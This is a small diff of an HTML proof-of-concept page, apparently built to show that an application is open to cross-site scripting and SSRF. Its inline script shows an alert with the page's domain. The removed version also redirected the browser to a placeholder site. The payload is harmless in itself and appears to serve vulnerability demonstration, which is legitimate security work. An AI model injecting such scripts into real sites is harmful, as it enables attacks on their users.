@@ -19,9 +19,8 @@
 
   <!-- IMMEDIATE XSS -->
   <script>
-    alert('XSS EXECUTED!\nDomain: ' + document.domain + '\nURL: ' + location.href);
-    // Redirect after user closes alert
-    setTimeout(() => { location = 'https://example.com'; }, 100);
+    alert('XSS EXECUTED!\n\nDomain: ' + document.domain + 
+          '\n\nApp is vulnerable to SSRF + XSS');
   </script>
 </body>
 </html>
